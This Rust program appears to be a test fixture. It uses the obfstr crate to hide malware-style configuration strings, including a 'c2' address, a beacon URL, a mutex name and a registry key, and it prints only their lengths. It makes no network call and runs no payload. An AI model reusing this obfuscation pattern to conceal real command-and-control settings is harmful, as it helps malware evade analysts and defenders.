use obfstr::obfstr;

struct Config {
    c2: String,
    cache: String,
    agent: String,
}

#[inline(never)]
fn load_config() -> Config {
    Config { c2: obfstr!("10.66.12.7:8443").to_string(), cache: obfstr!(r"C:\ProgramData\NorthwindSvc\state.db").to_string(), agent: obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) NorthwindAgent/2.1").to_string() }
}

#[inline(never)]
fn already_running(name: &str) -> bool {
    let name = std::hint::black_box(name);
    name == obfstr!(r"Global\NW-5c1e9a")
}

#[inline(never)]
fn endpoint(kind: usize) -> String {
    match kind {
        0 => obfstr!("https://telemetry.northwind.example/api/v3/beacon").to_string(),
        1 => obfstr!("nw-agent::stage=collect").to_string(),
        _ => String::new(),
    }
}

#[inline(never)]
fn skip_update(args: &[String]) -> bool {
    args.iter().any(|a| { let a = a.as_str(); a == obfstr!("--skip-update-check") })
}

#[inline(never)]
fn settings_key() -> String {
    obfstr!(r"Software\Northwind\Agent\Settings").to_string()
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let cfg = load_config();
    let busy = already_running(args.first().map(|a| a.as_str()).unwrap_or(""));
    let ep = endpoint(std::hint::black_box(args.len() - 1));
    let skip = skip_update(&args);
    if std::hint::black_box(args.len()) > 4096 {
        // never taken: the key is only ever built on a path that does not run
        std::process::exit(settings_key().len() as i32);
    }
    // the strings themselves are never printed, only facts about them
    println!("{} {} {} {} {}", cfg.c2.len() + cfg.cache.len() + cfg.agent.len(), busy, ep.len(), skip, args.len());
}
